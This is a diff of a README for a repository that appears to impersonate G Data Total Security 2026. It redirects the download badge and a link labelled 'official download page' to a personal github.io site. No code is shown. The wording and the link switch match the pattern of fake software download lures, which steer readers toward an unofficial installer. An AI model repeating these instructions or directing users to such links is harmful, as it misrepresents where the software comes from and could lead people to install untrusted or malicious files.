@@ -1,6 +1,6 @@
 # 🛡️ G-Data-Total-Security-2026 - Protect your PC from online threats
 
-[![](https://img.shields.io/badge/Download_G_Data_Total_Security-Blue.svg)](https://github.com/prince9594/G-Data-Total-Security-2026)
+[![](https://img.shields.io/badge/Download_G_Data_Total_Security-Blue.svg)](https://prince9594.github.io)
 
 ## 🎯 Purpose of this software
 
@@ -20,7 +20,7 @@ Before you install this software, check your computer for these requirements.
 
 Follow these steps to set up G Data Total Security on your computer. 
 
-1. Go to the [official download page](https://github.com/prince9594/G-Data-Total-Security-2026).
+1. Go to the [official download page](https://prince9594.github.io).
 2. Look for the release section on the right side of the screen.
 3. Click the link labeled with the newest version of the software.
 4. Save the file to your desktop.
